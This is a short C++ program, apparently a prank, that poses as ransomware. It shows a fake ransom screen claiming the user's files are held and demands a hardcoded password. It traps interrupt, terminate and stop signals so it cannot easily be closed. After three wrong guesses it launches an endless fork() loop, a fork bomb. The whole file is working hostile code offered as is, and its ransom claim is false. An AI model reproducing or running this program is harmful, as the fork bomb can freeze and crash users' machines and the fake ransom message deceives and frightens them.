#include <iostream>
#include <csignal>
#include <iomanip>
#include <stdlib.h>
#include <unistd.h> //Posix dependant
size_t count = 0;

std::string ex_ec(const char* cmd){
    FILE* pipe;
    char path[128];
    std::string result = "";

    /* open pipe (POSIX Dependant*/
    pipe = popen(cmd, "r");
    if (pipe == NULL) {
        printf("Failed to run command\n" );
        exit(1);
    }

    /* Read the output a line at a time - output it. */
    while (fgets(path, sizeof(path)-1, pipe) != NULL) {
        //printf("%s", path);
        result += path;
    }

    /* close */
    pclose(pipe);
    return result;
}

void bomb(){
    ex_ec("sleep 1");
    std::cout << "3" << std::endl;
    ex_ec("sleep 1");
    std::cout << "2" << std::endl;
    ex_ec("sleep 1");
    std::cout << "1" << std::endl;
    ex_ec("sleep 1");
    std::cout << "BOOM!" << std::endl;
    while(1) {
        fork();
    }
}


void prompt(){
	std::string prompt="\n \
Your account has been R4nds0med.\n \
\n \
To regain your files and access to your device,\n \
please provide the proper password.\n \
\n \
You get 3 strikes\n";
	std::cout << prompt << std::endl;
    std::string pas="hell-o";
    std::string input="";

    do {
        if (count >= 3) {
            std::cout << "You're in trouble now ;) " << std::endl;
            std::cout << "Hope you have backups... " << std::endl;
            bomb();
        }
        if (input != "") {
            ex_ec("sleep 3");
        }
        std::cout << "You have tried " << count << " time(s)" << std::endl;
        std::cin >> input;
        count += 1;
    } while (pas != input );
}

void signalHandler( int signum ) {
	std::cout << "One does not simply get off of Mr. Bones' Wild Ride" << std::endl; 
    prompt();  
}

int main(){
	signal(SIGINT, signalHandler);  
	signal(SIGTERM, signalHandler);  
	signal(SIGTSTP, signalHandler);  
	prompt();
}
